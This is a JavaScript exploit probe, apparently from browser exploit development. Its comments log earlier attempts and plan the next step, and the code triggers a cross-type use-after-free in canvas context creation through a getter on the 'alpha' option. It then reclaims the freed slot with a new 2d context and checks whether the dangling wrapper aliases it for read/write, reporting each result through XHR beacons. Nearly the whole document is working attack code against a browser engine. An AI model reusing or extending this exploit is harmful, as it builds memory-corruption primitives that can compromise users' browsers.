// p488d — cross-type UAF: same-type reclaim + pointer-identity alias test.
//
// V488b/V488c results: the UAF fires (dCtx=true, lCtx=true, cc=1), but every
// instance wedges right after the free and is killed by the ~30s watchdog
// (hold CLOSE at +30.3s). Source audit: save() is inline
// `{ ++m_unrealizedSaveCount; }` — it cannot hang. The wedge is the first
// synchronous XHR after the freed-context window, i.e. after a write into
// memory that was not reclaimed by the AB spray. This strongly suggests the
// slot is NOT in the general FastMalloc heap (WTF_MAKE_ISO_ALLOCATED), so no
// ArrayBuffer size class can ever take it.
//
// This probe stops betting on ABs. It tests the one reclaim that must work in
// either allocator: a same-type allocation immediately after the free.
//
//   1. Cross-type UAF (bitmaprenderer outer, 2d inner) → C1 freed, dCtx dangles
//   2. Create nc + c2 = nc.getContext('2d') as the very next same-type alloc
//   3. Alias test by POINTER IDENTITY ONLY:
//        dCtx.canvas === nc   → the dangling wrapper now wraps c2's object
//      This reads m_canvas at +32 and creates the canvas wrapper; it does NOT
//      touch m_stateStack, so no realizeSaves, no freed-buffer deref.
//   4. Only if alias is true, prove bidirectional R/W via fillStyle (both
//      wrappers now point at the same LIVE context, so this is safe).
//   5. Report through a pre-created XHR + pre-created strings (no new JS
//      allocations after the free, no save()).
//
// Outcomes:
//   ALIAS yes + RW yes → same-type reclaim confirmed; live GC-safe primitive.
//   ALIAS no           → c2 did not take the slot; the free may be deferred
//                        (wrapper keeps it alive) or the slot class differs.
//   No ALIAS beacon but hold closes at ~30s → even the canvas getter/XHR path
//                        wedges; fall back to property-free diagnostics.
//
// Beacon prefix: V488D-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V488D-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);
  window.__dCtx = null;
  window.onerror = function(m, u, l) {
    try { B('ERR', String(m).substring(0, 90) + '@' + l); } catch(e) {}
  };

  // Liveness oracle (async, before the free).
  try {
    var __hold = new XMLHttpRequest();
    __hold.open('GET', location.origin + '/hold?tag=V488D-' + Date.now(), true);
    __hold.onreadystatechange = function() {};
    __hold.send();
  } catch(e) {}

  var testC = document.createElement('canvas');
  testC.width = 1; testC.height = 1;
  var testBM = null;
  try { testBM = testC.getContext('bitmaprenderer'); } catch(e) {}
  var hasBitmap = !!testBM;
  B('BITMAP-CHECK', 'available=' + hasBitmap + ',type=' + typeof testBM);
  testC = null; testBM = null;
  if (!hasBitmap) { B('ABORT', 'no-bitmaprenderer'); return; }

  // ── Pre-create the report channel BEFORE the UAF ──
  var RQ = new XMLHttpRequest();
  var U_ALIAS = BASE + '/beacon/V488D-ALIAS';
  var U_RW    = BASE + '/beacon/V488D-RW';
  var U_CANV  = BASE + '/beacon/V488D-CANVAS';
  var U_END   = BASE + '/beacon/V488D-END';
  var S_YES = 'yes';
  var S_NO  = 'no';
  var S_END = 'end';
  function R(url, body) {
    try { RQ.open('POST', url, false); RQ.send(body); } catch(e) {}
  }

  // ── Cross-type UAF ──
  var dCtx = null, lCtx = null;
  var tc = document.createElement('canvas');
  tc.width = 10; tc.height = 10;
  document.body.appendChild(tc);

  var cc = 0, s = {};
  Object.defineProperty(s, 'alpha', {
    get: function() {
      cc++;
      if (cc === 1) dCtx = tc.getContext('2d');
      return true;
    }
  });

  try {
    lCtx = tc.getContext('bitmaprenderer', s);
  } catch(e) {
    B('OUTER-ERR', String(e && e.message || e));
  }
  window.__dCtx = dCtx;
  window.__lCtx = lCtx;
  if (!dCtx) { B('CROSSTYPE-FAIL', 'dCtx=null,cc=' + cc); return; }

  // ── Same-type reclaim: the very next 2d context ──
  var nc = document.createElement('canvas');
  nc.width = 5; nc.height = 5;
  document.body.appendChild(nc);
  var c2 = nc.getContext('2d');

  // ── Alias test: pointer identity, no state-stack access ──
  var alias = false;
  try { alias = (dCtx.canvas === nc); } catch(e) {}

  R(U_ALIAS, alias ? S_YES : S_NO);

  if (alias) {
    // Both wrappers now address the SAME LIVE context → bidirectional R/W.
    var rw = false;
    try {
      c2.fillStyle = '#abcdef';
      rw = (dCtx.fillStyle === '#abcdef');
    } catch(e) {}
    R(U_RW, rw ? S_YES : S_NO);

    // Extra identity evidence: the wrapper now sees c2's canvas, not tc.
    var onNew = false;
    try { onNew = (c2.canvas === nc) && (tc.getContext('bitmaprenderer') !== null); } catch(e) {}
    R(U_CANV, onNew ? S_YES : S_NO);
  }

  R(U_END, S_END);
})();
